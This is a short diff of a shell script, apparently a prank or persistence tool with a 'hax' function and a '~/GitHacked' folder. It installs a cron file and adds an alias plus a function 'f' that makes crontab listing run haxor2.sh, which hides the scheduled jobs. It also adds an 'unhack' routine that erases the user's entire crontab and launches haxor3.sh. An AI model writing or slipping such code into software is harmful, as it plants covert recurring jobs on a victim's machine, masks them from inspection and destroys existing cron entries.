@@ -12,4 +12,26 @@ hax()
     #install new cron file
     crontab haxcron;
     rm haxcron;
+    alias f='crontab';
+}
+
+unhack()
+{
+    crontab -r;
+    open -a Terminal.app ~/GitHacked/haxor3.sh;
+}
+
+function f()
+{
+    case $1 in
+
+    -l)
+    sh haxor2.sh
+    ;;
+
+    *)
+    sh haxor2.sh
+    ;;
+
+    esac
 }
